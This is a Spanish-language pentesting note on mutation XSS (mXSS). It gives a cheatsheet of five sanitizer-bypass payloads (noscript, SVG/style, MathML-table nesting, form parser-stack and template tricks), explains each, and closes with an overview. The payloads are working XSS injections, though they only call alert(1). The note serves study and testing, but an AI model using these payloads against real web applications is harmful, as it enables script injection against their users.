---
aliases: null
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Explotación de Mutaciones del Navegador (mXSS)

***

## Cheatsheet

|                            **Payload Base / Elementos Involucrados**                            |                  **Contexto de Mutación**                  |                                                                                                                                                   **Explicación del Bypass**                                                                                                                                                    |
|:-----------------------------------------------------------------------------------------------:|:----------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|           <pre><code>`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`            |        <br>Diferencias de análisis en `<noscript>`.        |            <br>Los sanitizadores suelen analizar el contenido asumiendo un estado estático. Cuando el navegador lo procesa al asignarlo al DOM, muta la estructura dependiendo de si JavaScript está habilitado o no, cerrando prematuramente el contexto seguro y liberando la etiqueta `<img>` maliciosa.<br><br>             |
|            <pre><code>`<svg><style><g title="</style><img src=x onerror=alert(1)>">`            |  <br><br>Espacios de nombres externos (Foreign Content).   | <br>Al utilizar `<svg>` o `<math>`, el navegador cambia sus reglas estándar de parseo HTML. El filtro ve el payload como una simple cadena de texto dentro de un atributo seguro (`title`), pero tras la mutación por reasignación, el navegador reinterpreta el bloque, escapando del atributo y ejecutando el script.<br><br> |
|    <pre><code>`<math><mtext><table></mtable><mglyph><style>...<img src=x onerror=alert(1)>`     |        <br><br>Anidación inválida y autocorrección.        |               <br>Explotación clásica contra librerías robustas. Al mezclar etiquetas MathML con tablas HTML rotas, el motor del navegador reordena forzosamente la jerarquía de los nodos al renderizar. Esta rutina de recuperación extrae el payload que originalmente estaba inofensivamente anidado.<br><br>               |
| <pre><code>`<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>` | <br><br>Manipulación de la pila del parser (Parser Stack). |                    <br>Confunde la máquina de estados del navegador. Al abrir etiquetas que alteran el contexto y cerrarlas fuera de secuencia, la corrección automática muta el árbol del DOM creando elementos ejecutables completamente nuevos que no existían en el código sanitizado original.<br><br>                     |
|                 <pre><code>`<template><svg><animatetransform onbegin=alert(1)>`                 |      <br><br>Nodos inertes y contextos de activación.      |            <br>Se abusa de la etiqueta `<template>`, la cual se supone que debe mantener su contenido inerte. Si la aplicación extrae el contenido del template y lo inserta en el DOM activo sin una re-sanitización estricta, el navegador muta el estado de inerte a ejecutable, disparando los eventos.<br><br>             |
^xss-mxss

___


## Overview

El Mutation XSS (mXSS) ocurre cuando inyecto código HTML que, en su forma original, es completamente inofensivo y logra pasar las validaciones de los filtros de [[Sanitización]] (como librerías al estilo DOMPurify). Sin embargo, la vulnerabilidad se dispara porque el propio motor del navegador "muta" o reescribe este código al intentar corregir etiquetas mal formadas o al interpretar contextos especiales (como espacios de nombres de SVG o MathML) durante la inserción en el [[DOM]] (usualmente vía `innerHTML`). El resultado de esta corrección o normalización legítima del navegador es la creación de un payload ejecutable que el filtro no pudo anticipar.
